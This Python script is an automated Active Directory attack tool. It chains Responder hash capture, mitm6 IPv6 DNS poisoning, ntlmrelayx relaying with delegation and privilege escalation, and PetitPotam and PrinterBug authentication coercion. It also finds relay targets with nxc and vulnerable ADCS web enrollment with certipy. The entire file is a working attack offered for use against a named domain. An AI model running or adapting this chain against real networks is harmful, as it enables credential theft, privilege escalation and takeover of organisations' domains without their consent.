#!/usr/bin/env python3

import argparse
import sys
import os
import re
import asyncio
import dns.resolver
import ipaddress
import netifaces
import signal
import tempfile
from termcolor import colored
from subprocess import Popen, PIPE
from datetime import datetime
from netaddr import IPNetwork, AddrFormatError
from pathlib import Path

class AutoRelay:
    def __init__(self, domain, interface=None):
        self.domain = domain
        self.interface = interface or self.get_default_interface()
        self.local_ip = self.get_local_ip()
        self.dcs = set()
        self.relay_targets = set()
        self.adcs_targets = set()
        self.webdav_targets = set()
        self.captured_hashes = set()
        self.processes = []
        self.temp_dir = tempfile.mkdtemp()

    def get_default_interface(self):
        """Get default network interface"""
        try:
            return netifaces.gateways()['default'][netifaces.AF_INET][1]
        except:
            ifaces = []
            for iface in netifaces.interfaces():
                if not iface.startswith('lo'):
                    addrs = netifaces.ifaddresses(iface)
                    if netifaces.AF_INET in addrs:
                        ifaces.append(iface)
            return ifaces[0] if ifaces else None

    def get_local_ip(self):
        """Get local IP address"""
        return netifaces.ifaddresses(self.interface)[netifaces.AF_INET][0]['addr']

    def setup_logging(self):
        """Setup logging directory"""
        log_dir = Path('logs')
        log_dir.mkdir(exist_ok=True)
        return log_dir

    async def start_responder(self):
        """Start Responder for hash capture"""
        print_info("Starting Responder for hash capture")
        cmd = f"responder -I {self.interface} -wrf"
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        self.processes.append(proc)
        return proc

    async def start_mitm6(self):
        """Start mitm6 for IPv6 DNS poisoning"""
        print_info("Starting mitm6 for IPv6 DNS poisoning")
        cmd = f"mitm6 -d {self.domain} -i {self.interface}"
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        self.processes.append(proc)
        return proc

    async def start_ntlmrelayx(self, targets_file):
        """Start ntlmrelayx with appropriate options"""
        print_info("Starting ntlmrelayx")
        cmd = (f"ntlmrelayx.py -tf {targets_file} --smb2support "
               f"--delegate-access --escalate-user --serve-image {self.temp_dir}/scf.jpg "
               f"--http-port 8080 --socks")
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        self.processes.append(proc)
        return proc

    async def discover_dcs(self):
        """Find domain controllers"""
        print_info(f"Discovering Domain Controllers for {self.domain}")
        resolver = dns.resolver.Resolver()
        queries = [
            f'_ldap._tcp.dc._msdcs.{self.domain}',
            f'_kerberos._tcp.dc._msdcs.{self.domain}',
            f'_gc._tcp.{self.domain}'
        ]
        
        for query in queries:
            try:
                answers = resolver.resolve(query, 'SRV')
                for answer in answers:
                    dc_hostname = str(answer.target).rstrip('.')
                    try:
                        dc_ips = resolver.resolve(dc_hostname, 'A')
                        for ip in dc_ips:
                            self.dcs.add(str(ip))
                            print_good(f'Found DC: {dc_hostname} ({ip})')
                    except Exception as e:
                        print_bad(f'Error resolving DC {dc_hostname}: {str(e)}')
            except:
                continue

    async def scan_subnets(self):
        """Scan subnets for targets"""
        subnets = set()
        for dc in self.dcs:
            try:
                ip = ipaddress.ip_address(dc)
                network = ipaddress.ip_network(f'{ip.exploded}/24', strict=False)
                subnets.add(str(network))
                print_good(f'Added subnet: {network}')
            except Exception as e:
                print_bad(f'Error processing subnet: {str(e)}')

        for subnet in subnets:
            print_info(f'Scanning subnet {subnet}')
            cmd = f"nxc smb {subnet} --gen-relay-list {self.temp_dir}/targets.txt"
            proc = await asyncio.create_subprocess_shell(cmd)
            await proc.communicate()

    async def coerce_auth(self):
        """Run PetitPotam and PrinterBug against targets"""
        for target in self.relay_targets:
            print_info(f"Attempting auth coercion against {target}")
            # PetitPotam
            cmd = f"PetitPotam.py -d {self.domain} {self.local_ip} {target}"
            proc = await asyncio.create_subprocess_shell(cmd)
            await proc.communicate()
            
            # PrinterBug
            cmd = f"dementor.py -d {self.domain} -u anonymous -p '' {self.local_ip} {target}"
            proc = await asyncio.create_subprocess_shell(cmd)
            await proc.communicate()

    async def check_adcs(self):
        """Check for ADCS HTTP endpoints"""
        for target in self.relay_targets:
            cmd = f"certipy find -u anonymous -p '' -dc-ip {target} -vulnerable -stdout"
            proc = await asyncio.create_subprocess_shell(cmd)
            stdout, _ = await proc.communicate()
            if b'HTTP/HTTPS Web Enrollment' in stdout:
                self.adcs_targets.add(target)
                print_good(f'Found ADCS HTTP endpoint on {target}')

    def cleanup(self):
        """Cleanup temporary files and kill processes"""
        print_info("Cleaning up...")
        for proc in self.processes:
            try:
                proc.terminate()
            except:
                pass
        
        try:
            os.remove(f"{self.temp_dir}/targets.txt")
            os.remove(f"{self.temp_dir}/scf.jpg")
            os.rmdir(self.temp_dir)
        except:
            pass

    async def auto_relay(self):
        """Run the full auto relay chain"""
        try:
            # Setup signal handler for cleanup
            signal.signal(signal.SIGINT, lambda x,y: self.cleanup())
            
            # Create logging directory
            log_dir = self.setup_logging()

            # Start Responder
            responder_proc = await self.start_responder()

            # Start mitm6
            mitm6_proc = await self.start_mitm6()

            # Discover DCs
            await self.discover_dcs()
            if not self.dcs:
                print_bad("No Domain Controllers found")
                return

            # Scan subnets
            await self.scan_subnets()

            # Read discovered targets
            targets_file = f"{self.temp_dir}/targets.txt"
            if os.path.exists(targets_file):
                with open(targets_file) as f:
                    self.relay_targets.update(f.read().splitlines())

            if not self.relay_targets:
                print_bad("No relay targets found")
                return

            print_good(f"Found {len(self.relay_targets)} relay targets")

            # Check for ADCS
            await self.check_adcs()
            if self.adcs_targets:
                print_good(f"Found {len(self.adcs_targets)} ADCS targets")

            # Start ntlmrelayx
            ntlmrelayx_proc = await self.start_ntlmrelayx(targets_file)

            # Start coercion attacks
            await self.coerce_auth()

            # Keep running until interrupted
            print_info("Attack chain running. Press Ctrl+C to stop...")
            while True:
                await asyncio.sleep(1)

        except KeyboardInterrupt:
            print_info("Received interrupt, cleaning up...")
        finally:
            self.cleanup()

def parse_args():
    parser = argparse.ArgumentParser(description='Find and auto-attack SMB relay targets')
    parser.add_argument("-d", "--domain", required=True, help="Domain to attack (e.g. domain.local)")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("--auto", action="store_true", help="Enable automatic attack chain")
    return parser.parse_args()

def print_bad(msg):
    print(colored('[-] ', 'red') + msg)

def print_info(msg):
    print(colored('[*] ', 'blue') + msg)

def print_good(msg):
    print(colored('[+] ', 'green') + msg)

async def main():
    args = parse_args()
    
    if os.geteuid():
        print_bad('Script must be run as root')
        sys.exit(1)

    if args.auto:
        print_info("Starting automatic relay attack chain")
        relay = AutoRelay(args.domain, args.interface)
        await relay.auto_relay()
    else:
        print_bad("Please use --auto for automatic attack chain")

if __name__ == "__main__":
    asyncio.run(main())
